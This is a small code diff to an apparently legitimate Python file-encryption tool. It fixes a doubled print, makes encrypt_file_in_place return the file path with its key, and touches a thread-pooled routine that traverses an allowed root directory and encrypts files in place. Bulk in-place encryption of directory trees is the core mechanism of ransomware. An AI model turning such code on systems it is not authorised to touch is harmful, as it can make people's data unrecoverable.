@@ -122,8 +122,8 @@ def encrypt_file_in_place(filepath, chunk_size=64 * 1024):
             f.seek(0)
             f.write(base_nonce)
 
-        print(print(f"Successfully encrypted: {filepath}"))
-        return key
+        print(f"Successfully encrypted: {filepath}")
+        return filepath, key
         
     except Exception as e:
         print(f"Error encrypting {filepath}: {e}")
@@ -200,7 +200,7 @@ def traverse_and_encrypt(directory,max_workers=4):
     traverse(sanitizer.allowed_root)    
     key_manifest = {}
 
-    
+
     # Execution Phase: Distribute discovered files across the thread pool
     print(f"Starting concurrent processing with {max_workers} threads across {len(file_list)} files...")
     with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
